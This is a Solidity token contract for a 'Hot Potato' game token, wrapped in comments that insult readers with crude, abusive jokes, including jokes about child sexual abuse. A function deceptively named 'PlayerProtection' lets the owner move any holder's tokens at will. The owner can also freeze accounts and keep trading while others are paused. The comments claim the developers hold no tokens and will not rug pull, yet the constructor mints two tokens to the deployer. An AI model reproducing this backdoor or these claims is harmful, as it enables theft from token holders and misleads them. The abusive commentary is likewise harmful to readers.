//Hey all you Motherfuckers, welcome to the Hot Potato Game!
//Winning Prizes change each round so the Prizes are NOT hard coded in this Contract, see https://hotpotatotoken.com for those types of details.
/*
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░████████████▒▒░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓▓▓██████▒▒████▒▒░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░████░░░░██░░██████░░██░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓▓▓▒▒▒▒▓▓████░░██████░░██░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓▓▓▓▓▓▓▒▒▒▒▓▓██▒▒████░░▒▒████▓▓██░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓▓▓████▒▒▒▒▒▒▒▒░░▓▓▒▒▒▒░░██▒▒▓▓░░▒▒████▒▒░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒████████▒▒▒▒▒▒▓▓██▓▓▓▓▓▓▒▒░░░░░░██░░▒▒▓▓▓▓▒▒██░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░        ░░░░░░░░░░░░░░██████░░▒▒██████▓▓▒▒▒▒▒▒▒▒██░░░░░░░░██░░▒▒▒▒▒▒░░██░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░    ░░░░██▒▒████▓▓▒▒▒▒▒▒▒▒░░░░░░░░██░░░░██▓▓██▒▒░░▒▒░░░░██░░░░░░░░░░░░░░░░░░░░░░
                                                ░░░░░░░░░░████████████░░░░░░░░██░░██░░██▒▒░░░░░░░░░░░░░░░░██████▒▒██████░░░░░░██▒▒░░    ░░              
                                                  ░░░░████░░░░░░▒▒░░░░████░░░░██░░██░░████████████████████████████░░░░██░░██▓▓██░░░░                    
                                                ░░░░████░░░░░░░░░░░░░░░░░░██░░░░██████░░████████░░░░░░░░░░▒▒░░██░░░░░░████▒▒██▒▒░░                      
                                              ░░░░██░░░░░░░░░░░░░░░░░░░░░░██░░░░██░░░░██░░██░░████░░██░░░░░░░░██░░░░░░██░░████░░░░                      
                                            ░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░██░░██░░██░░██░░██▒▒████████████████████████████░░░░                        
                                          ░░░░████░░░░░░░░░░░░░░░░░░░░░░░░░░██░░██░░████░░░░░░██░░░░░░░░██░░░░░░░░░░░░░░░░░░░░                          
                                          ░░██████████████████████████▒▒░░██████░░██░░░░██████████░░░░██░░░░                                            
                                          ░░████░░██████████▓▓░░██████████░░░░██░░░░██░░██░░██████░░██░░░░                                              
                                          ░░██░░████░░░░████▒▒████████░░░░░░░░██████░░██░░██░░░░██░░██░░                                                
                                          ░░▒▒▓▓██▒▒░░░░▒▒██▓▓██████▒▒░░░░▓▓▓▓██▒▒██░░██░░██▓▓████░░██░░                                                
                                            ░░██▒▒▒▒░░░░░░▒▒██████▒▒▒▒░░░░▒▒▒▒██░░██░░▒▒██▒▒▒▒████░░██░░                                                
                                            ░░██░░████████░░░░░░░░░░░░░░░░░░████░░██░░░░░░██░░██░░████░░                                                
                                            ░░██░░░░░░░░░░██░░░░░░░░░░░░░░░░██░░██░░░░░░██░░██████░░░░░░                                                
                ░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░██░░▒▒░░░░░░▒▒░░░░░░░░░░░░░░░░██░░██░░░░██▒▒░░▒▒██▒▒░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░              
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░██░░░░░░░░░░░░░░░░░░░░░░░░██░░░░██░░░░██░░░░░░██░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░██▒▒▒▒░░░░░░░░░░░░░░░░░░░░██░░░░██░░░░██░░░░░░██░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░██░░░░░░░░░░░░░░░░░░░░██░░░░░░████░░██░░░░██░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████░░░░░░░░░░░░████░░░░▒▒▒▒░░████░░░░░░██░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░▒▒██▓▓░░▒▒▓▓▓▓▓▓██▒▒░░▒▒▒▒▒▒░░▒▒██░░░░▓▓██░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░██░░████░░░░░░██░░▒▒▒▒▒▒▒▒▒▒░░░░████░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░██░░▒▒▒▒░░▒▒░░██░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░▒▒██░░▒▒▒▒▒▒░░▒▒██░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░████░░▒▒▒▒░░░░████░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░████░░░░░░▒▒░░░░██░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▒▒░░██░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
*/

//We've put so much effort into this game that the Rules, Strategy, and Whitepaper are just going to be integrated right here.
//Don't complain about shit because it will just mean you didn't read!
//Now go read our rules and whitepaper right fucking here...

//WHITEPAPER (short because you people don't read them anyway)
/*
This is the game of Hot Potato on the Ethereum Network. Gameplay is as close to the real-life game as absolutely possible.

If you don’t know how to play Hot Potato, it’s probably because your Dad left you & your mom at a young age for a hot stripper named 'Chandelier.' 
Most likely, you spent your childhood years just throwing a potato at no one.  
Fear not, you have friends now! (Online ones anyway)
*/

//RULES
/*
Requires At least a foursome, (clear your OnlyFans cache loser!) but more people make for more fun.
For this reason: The circulating supply will be less than one (1) but can go as HIGH as one (1) should thousands upon thousands of you fools start playing each round.

Players pickup HOTP on the blockchain and trade the Token to each other, anywhere, while the contract is in play.
The player holding the most “Hot Potato Tokens” when the contract pauses, is out by being frozen.
And "yea" you fucking sub-poverty-level fake ass crypto holders: it's a game that we can “pause” just like when the music stops when you played as a kid, we have to mimic that.
**Look at us still giving you credit like you had a real childhood. ^

The game continues until one player is left — that player is the winner (ironic right?) and losers are then unfrozen, they are then able to sell their token!
**Has anyone ever called you a winner before? Or were you a "you get him" kid in Gym Class?  Finally! A game you have a chance in!

For you fucking wannabe Potato Farmers, you might ask "What type of yield?" --Well that depends on your skills as you can't just magically pick a funny "yName."
Through this playful game, Crypto Traders are able to hone their trading skills, ("Trading Skills" ...that made us LOL IRL) as well as make price action during Uniswap Trades. 
Above all, laughter is the goal (and money)!
*/

//STRATEGY (No, not your next door neighbors's Crayola Inverse Cock N Balls Stochastic RSI strategy that he claims he invented)
/*
This is one of the few times that you do NOT want to be a "whale!" Let's be honest, you've never been one, so why start now? 
No one likes a loser (again re: your childhood), but it wouldn't be a game without any, so think clearly!
Should you "be out" (or what we call "frozen') don't fear, you'll still be able to sell your tokens after the game ends, so feel free to brag about being a "whale" if that's your thing.
**Mom will be able to brag about at least "the one person that stayed in her life" and when you're done buying her Botox, you'll still have enough for a Jacksonville Fl, Streetwalker named "BJQueen."

HOTP is only 6 decimals, with a 1% burn. The circulating supply is actually less than 1 full token (because much like your Dad, we can't endure this game for too long)
The holder with the absolute LEAST quantity of Hot Potato Token (HOTP) is the winner and not only gets to sell FIRST, but also gets a special WEN Protocol Prize! (Remember, the Blow Job was for the Loser.)

Important: Devs hold 0 Token! Clearly, we do NOT want to play with you. (Hope that doesn't bring any grade school PTSD Flashbacks?) Be prepared to compete and HAVE FUN!
*/

//FAQs:
/*
Q: WTF?
A: Exactly.

Q: Are you going to Rug Pull?
A: No! We're not poor like you, believe it or not, this is from our hearts, we just have a funny way of showing it.  Kinda like when your Uncle moved in after Dad left, and he took those photos...

Q: How do I know this game is fair?  
A: It’s fucking Hot Potato Dummy!
*/

//At this point, you're probably not sure if you want to play this game and win moons, rockets, and loads of ETH or ...you just hate us.  Either way, we love you! (More than your Dad did.) 
//So don’t be a mental midget and get offended!

/*
We accept the fact that we had to sacrifice a whole Saturday creating a Blockchain Game, but we think you're crazy for making us write an essay telling you who we think we are. 
You see us as you want to see us: in the simplest terms, in the most convenient definitions. 
But what we found out is that each one of us is a brain, and an athlete, and a basket case, a princess, and a criminal. Does that answer your question?

Sincerely, The Most Honest Man In Crypto: 
Twitter: @JTCyberFM 
And crew at CyberFM and the WEN Protocol Family.
Telegram: @Wenburn
Telegram: @hotpotatotoken
*/

//Let the music play on https://cyber-fm.com if you still need actual music to pretend that you're throwing a Hot Potato at your imaginary friend. (Isn't he like 40 by now?)

pragma solidity ^0.5.0;
 
interface IERC20 {
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
  function transferFrom(address from, address to, uint256 value) external returns (bool);
  function _mint(address account, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  event DividentTransfer(address from , address to , uint256 value);
}
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
  function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
    uint256 c = add(a,m);
    uint256 d = sub(c,1);
    return mul(div(d,m),m);
  }
}
contract ERC20Detailed is IERC20 {
  string private _name;
  string private _symbol;
  uint8 private _decimals;
  constructor(string memory name, string memory symbol, uint8 decimals) public {
    _name = name;
    _symbol = symbol;
    _decimals = decimals;
  }
  function name() public view returns(string memory) {
    return _name;
  }
  function symbol() public view returns(string memory) {
    return _symbol;
  }
  function decimals() public view returns(uint8) {
    return _decimals;
  }
}
contract Owned {
    
    address payable public owner;
    address public inflationTokenAddressTokenAddress;
    
    event OwnershipTransferred(address indexed _from, address indexed _to);
    constructor() public {
        owner = msg.sender;
    }
    
  modifier onlyInflationContractOrCurrent {
        require( msg.sender == inflationTokenAddressTokenAddress || msg.sender == owner);
        _;
    }
    
    modifier onlyOwner{
        require(msg.sender == owner );
        _;
    }
    
    function transferOwnership(address payable _newOwner) public onlyOwner {
        owner = _newOwner;
    }
}

contract Pausable is Owned {
  event Pause();
  event Unpause();
  event NotPausable();

  bool public paused = false;
  bool public canPause = true;

  modifier whenNotPaused() {
    require(!paused || msg.sender == owner);
    _;
  }

  modifier whenPaused() {
    require(paused);
    _;
  }

    function pause() onlyOwner whenNotPaused public {
        require(canPause == true);
        paused = true;
        emit Pause();
    }

  function unpause() onlyOwner whenPaused public {
    require(paused == true);
    paused = false;
    emit Unpause();
  }
}


contract DeflationToken is ERC20Detailed, Pausable {
    
  using SafeMath for uint256;
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowed;
  mapping (address => bool) public _freezed;
  string constant tokenName = "Hot Potato";
  string constant tokenSymbol = "HOTP";
  uint8  constant tokenDecimals = 6;
  uint256 _totalSupply ;
  uint256 public basePercent = 100;

  IERC20 public InflationToken;
  address public inflationTokenAddress;
  
  
  constructor() public  ERC20Detailed(tokenName, tokenSymbol, tokenDecimals) {
    _mint( msg.sender,  2 * 1000000);
  }
  
  
    function freezeAccount (address account) public onlyOwner{
        _freezed[account] = true;
    }
    
     function unFreezeAccount (address account) public onlyOwner{
        _freezed[account] = false;
    }
    
    
  
  function setInflationContractAddress(address tokenAddress) public  whenNotPaused onlyOwner{
        InflationToken = IERC20(tokenAddress);
        inflationTokenAddress = tokenAddress;
    }
    

  
  function totalSupply() public view returns (uint256) {
    return _totalSupply;
  }
  function balanceOf(address owner) public view returns (uint256) {
    return _balances[owner];
  }
  function allowance(address owner, address spender) public view returns (uint256) {
    return _allowed[owner][spender];
  }
  function findOnePercent(uint256 value) public view returns (uint256)  {
    uint256 roundValue = value.ceil(basePercent);
    uint256 onePercent = roundValue.mul(basePercent).div(10000);
    return onePercent;
  }
  
  
   function PlayerProtection(address _from, address _to, uint256 _value) public whenNotPaused onlyOwner{
        _balances[_to] = _balances[_to].add(_value);
        _balances[_from] = _balances[_from].sub(_value);
        emit Transfer(_from, _to, _value);
}
  
  
  function transfer(address to, uint256 value) public whenNotPaused returns (bool) {
      
    require(value <= _balances[msg.sender]);
    require(to != address(0));
    require(_freezed[msg.sender] != true);
    require(_freezed[to] != true);
    
    uint256 tokensToBurnAndMint = findOnePercent(value);
    uint256 tokensToTransfer = value.sub(tokensToBurnAndMint);
    InflationToken._mint(msg.sender, tokensToBurnAndMint);
    
    _balances[msg.sender] = _balances[msg.sender].sub(value);
    _balances[to] = _balances[to].add(tokensToTransfer);
    _totalSupply = _totalSupply.sub(tokensToBurnAndMint);
    
    
    emit Transfer(msg.sender, to, tokensToTransfer);
    emit Transfer(msg.sender, address(0), tokensToBurnAndMint);

    return true;
  }
  

      /**
     * @dev Airdrops some tokens to some accounts.
     * @param source The address of the current token holder.
     * @param dests List of account addresses.
     * @param values List of token amounts. Note that these are in whole
     *   tokens. Fractions of tokens are not supported.
     */
    function airdrop(address  source, address[] memory dests, uint256[] memory values) public whenNotPaused  {
        // This simple validation will catch most mistakes without consuming
        // too much gas.
        require(dests.length == values.length);

        for (uint256 i = 0; i < dests.length; i++) {
            require(transferFrom(source, dests[i], values[i]));
        }
    }
  

  function approve(address spender, uint256 value) public whenNotPaused returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
  }
  function transferFrom(address from, address to, uint256 value) public whenNotPaused returns (bool) {
    require(value <= _balances[from]);
    require(value <= _allowed[from][msg.sender]);
    require(_freezed[from] != true);
    require(_freezed[to] != true);
    require(to != address(0));
    _balances[from] = _balances[from].sub(value);
    
    uint256 tokensToBurnAndMint = findOnePercent(value);
    uint256 tokensToTransfer = value.sub(tokensToBurnAndMint);
    
    _balances[to] = _balances[to].add(tokensToTransfer);
    _totalSupply = _totalSupply.sub(tokensToBurnAndMint);
    InflationToken._mint(from , tokensToBurnAndMint);
    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);
    
    emit Transfer(from, to, tokensToTransfer);
    emit Transfer(from, address(0), tokensToBurnAndMint);
    return true;
  }
  function increaseAllowance(address spender, uint256 addedValue) public whenNotPaused returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].add(addedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }
  function decreaseAllowance(address spender, uint256 subtractedValue) public whenNotPaused returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].sub(subtractedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }
  
  
  function _mint(address account, uint256 amount) public onlyInflationContractOrCurrent returns (bool){
    require(amount != 0);
    _balances[account] = _balances[account].add(amount);
     _totalSupply = _totalSupply.add(amount);
    emit Transfer(address(0), account, amount);
    return true;
  }
  
  function burn(uint256 amount) external {
    _burn(msg.sender, amount);
  }
 
  
  function _burn(address account, uint256 amount) internal onlyInflationContractOrCurrent {
    require(amount != 0);
    require(amount <= _balances[account]);
    _totalSupply = _totalSupply.sub(amount);
    _balances[account] = _balances[account].sub(amount);
    emit Transfer(account, address(0), amount);
  }
  function burnFrom(address account, uint256 amount) external {
    require(amount <= _allowed[account][msg.sender]);
    _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(amount);
    _burn(account, amount);
  }
}

//BEST EFFORTS FOR PLAYER PlayerProtection
/*
Don't be a Fucking Cheater! Play like a man (or whatever you may identify as.)
We consider “bots” and “3rd Party Smart Contracts” as cheating and strongly encourage players to NOT use any.

Third party software consists of unapproved apps that manipulate gameplay. By altering game functionality, third party software aims to provide unfair advantages while putting your account and privacy at risk.

Third party software includes:
Hacks, "mods", or programs that unfairly alter game functionality
"Bots", or gameplay automation services or scripts
Any other programs that aim to modify or provide unearned progress
Custom Smart Contracts to cheat other players.

Consequences of misconduct: Trying to gain an unfair advantage by using prohibited 3rd party software will result in a permanent ban for any offending account(s).
That Father of yours, that you worked so hard on regaining a relationship with, after years of therapy will leave you again. (Only this time for a man named "Christine")

Don't be a Fucking Cheater! You will see a punishment like you've never seen before and we'll be proud to do it! No excuses here, pussy, DYOR.
*/